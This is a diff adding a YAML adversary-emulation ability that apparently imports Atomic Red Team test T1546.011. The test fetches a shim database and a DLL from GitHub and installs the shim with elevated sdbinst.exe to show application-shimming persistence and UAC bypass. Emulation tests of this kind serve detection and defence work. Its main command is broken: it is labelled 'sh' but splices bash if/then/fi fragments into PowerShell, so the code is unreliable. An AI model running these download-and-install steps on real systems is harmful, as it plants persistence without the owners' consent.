@@ -1,0 +1,77 @@
+- id: 9ab27e22-ee62-4211-962b-d36d9a0e6a18
+  name: Application Shim Installation
+  description: "Install a shim database. This technique is used for privilege escalation\
+    \ and bypassing user access control.\nUpon execution, \"Installation of AtomicShim\
+    \ complete.\" will be displayed. To verify the shim behavior, run \nthe AtomicTest.exe\
+    \ from the <PathToAtomicsFolder>\\\\T1546.011\\\\bin directory. You should see\
+    \ a message box appear\nwith \"Atomic Shim DLL Test!\" as defined in the AtomicTest.dll.\
+    \ To better understand what is happening, review\nthe source code files is the\
+    \ <PathToAtomicsFolder>\\\\T1546.011\\\\src directory."
+  tactic: persistence
+  technique:
+    attack_id: T1546.011
+    name: 'Event Triggered Execution: Application Shimming'
+  platforms:
+    windows:
+      sh:
+        command: 'if (Test-Path "PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb")
+          {exit 0} else {exit 1}; then : ; else [Net.ServicePointManager]::SecurityProtocol
+          = [Net.SecurityProtocolType]::Tls12; New-Item -Type Directory (split-path
+          "PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb") -ErrorAction ignore
+          | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb"
+          -OutFile "PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb"; fi; if (Test-Path
+          c:\Tools\AtomicTest.dll) {exit 0} else {exit 1}; then : ; else New-Item
+          -Type Directory (split-path c:\Tools\AtomicTest.dll) -ErrorAction ignore
+          | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll"
+          -OutFile c:\Tools\AtomicTest.dll; fi; sdbinst.exe "PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb"'
+        cleanup: sdbinst.exe -u "#{file_path}" >nul 2>&1
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - persistence
+  - t1546.011
+  - atomic-red-team
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      file_path:
+        description: Path to the shim database file
+        type: string
+        default: PathToAtomicsFolder\T1546.011\bin\AtomicShimx86.sdb
+    dependencies:
+    - description: 'Shim database file must exist on disk at specified location (#{file_path})
+
+        '
+      prereq_command: 'if (Test-Path "#{file_path}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+        New-Item -Type Directory (split-path "#{file_path}") -ErrorAction ignore |
+        Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicShimx86.sdb"
+        -OutFile "#{file_path}"
+
+        '
+    - description: 'AtomicTest.dll must exist at c:\Tools\AtomicTest.dll
+
+        '
+      prereq_command: 'if (Test-Path c:\Tools\AtomicTest.dll) {exit 0} else {exit
+        1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path c:\Tools\AtomicTest.dll)
+        -ErrorAction ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.011/bin/AtomicTest.dll"
+        -OutFile c:\Tools\AtomicTest.dll
+
+        '
+    technique_created: '2020-01-24T14:56:24.231Z'
+    atomic_guid: 9ab27e22-ee62-4211-962b-d36d9a0e6a18
+    import_timestamp: '2025-06-24T11:15:03.826277Z'
